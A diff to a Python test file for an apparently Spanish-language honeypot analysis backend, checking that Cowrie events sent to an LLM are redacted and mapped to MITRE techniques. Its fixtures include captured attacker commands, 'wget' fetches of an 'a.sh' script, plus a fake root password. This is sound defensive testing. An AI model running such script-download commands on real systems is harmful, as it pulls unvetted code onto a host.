@@ -33,12 +33,22 @@ class AnalysisReportTests(unittest.TestCase):
             SimpleNamespace(id_evento=41, tipo_evento="cowrie.login.failed", fecha_hora=at,
                             datos_originales={"username": "root", "password": "captured-secret"}),
             SimpleNamespace(id_evento=42, tipo_evento="cowrie.command.input", fecha_hora=at + timedelta(seconds=10),
-                            datos_originales={"input": "wget http://example.org/a.sh", "nested": {"token": "captured-token"}}),
+                            datos_originales={"eventid": "cowrie.command.input",
+                                "input": "wget 'http://files.corp.local/a.sh?token=private-query&x=2'",
+                                "nested": {"token": "captured-token"}}),
         ]
         self.env = patch.dict("os.environ", {"LLM_API_KEY": "test-only-key", "LLM_MODEL": "test-model",
                                               "LLM_BASE_URL": "https://example.invalid/v1"})
         self.env.start()
         self.addCleanup(self.env.stop)
+        from backend.rag.behavior import represent
+        self.catalog = patch('backend.routes.rag_context', side_effect=lambda events:{
+            'catalogo':{'version':'fixture-20.1'},'representacion':represent(events),
+            'candidatos':[{'codigo_tecnica':'T1059.004','nombre':'Unix Shell',
+                'definicion':'Unix shell commands and scripts for execution in an emulated context.',
+                'tacticas':[{'codigo_tactica':'TA0002','nombre':'Execution'}]}]})
+        self.catalog.start()
+        self.addCleanup(self.catalog.stop)
 
     def provider(self, content, finish="stop"):
         response = Mock()
@@ -54,8 +64,14 @@ class AnalysisReportTests(unittest.TestCase):
         facts = json.loads(request["messages"][1]["content"])
         self.assertNotIn("captured-secret", request["messages"][1]["content"])
         self.assertNotIn("captured-token", request["messages"][1]["content"])
+        self.assertNotIn("private-query", request["messages"][1]["content"])
+        self.assertEqual(facts["observables_por_evento"]["42"], [{
+            "referencia": 1, "tipo": "URL", "campo": "input",
+            "comportamiento": "intento_descarga", "grado_evidencia": "intento",
+        }])
         self.assertEqual(facts["eventos"][0]["datos"]["password"], "[REDACTED]")
         self.assertEqual(facts["contexto_calculado"]["comandos"], 1)
+        self.assertEqual(facts['tecnicas_mitre_permitidas'][0]['codigo_tecnica'],'T1059.004')
         self.assertEqual(request["max_tokens"], 8192)
         self.assertEqual(request["response_format"], {"type": "json_object"})
 
@@ -66,6 +82,18 @@ class AnalysisReportTests(unittest.TestCase):
         self.assertEqual(context["comandos"], 1)
         self.assertEqual(context["autenticaciones_fallidas"], 1)
         self.assertEqual(context["autenticaciones_exitosas"], 0)
+
+    def test_provider_usage_is_retained_without_arbitrary_response_metadata(self):
+        content=json.dumps({'resumen':'Intento observado','acciones':[],'informe':report_data()})
+        response=Mock();response.json.return_value={'model':'deepseek-reported-fixture',
+            'usage':{'prompt_tokens':100,'completion_tokens':30,'total_tokens':130,'prompt_cache_hit_tokens':-1,
+                     'untrusted_secret':'must-not-be-stored'},
+            'choices':[{'finish_reason':'stop','message':{'content':content}}]}
+        rag={'catalogo':{'version':'fixture'},'representacion':{},'candidatos':[]}
+        with patch('backend.routes.httpx.post',return_value=response):real_result(self.events,rag)
+        self.assertEqual(rag['respuesta_proveedor']['uso'],{'prompt_tokens':100,'completion_tokens':30,'total_tokens':130})
+        self.assertEqual(rag['respuesta_proveedor']['modelo_reportado'],'deepseek-reported-fixture')
+        self.assertNotIn('must-not-be-stored',json.dumps(rag))
 
     def test_rejects_foreign_event_in_phase_or_hypothesis(self):
         for field in ("fases", "hipotesis"):
